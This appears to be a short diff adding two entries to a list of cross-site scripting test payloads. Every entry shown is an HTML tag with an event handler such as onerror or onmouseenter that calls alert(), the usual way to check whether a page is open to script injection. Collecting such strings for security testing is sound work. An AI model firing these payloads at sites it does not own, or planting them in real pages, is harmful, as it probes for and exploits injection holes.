@@ -28,3 +28,5 @@ frame?timer=</div><button onmouseenter="alert(1)">Lol</button><div>
 <script src="" onerror=alert(1)></script>
 /><img src="" onerror=alert(1)></script>
 /><ImG sRc="" onerror=alert('XSS')></ImG>
+<button onmouseenter=alert(1)>HELLO WORLD</button>
+<img src="sewr83450t9r4tertertertreyhtyu67u5r" onerror=alert(1) />
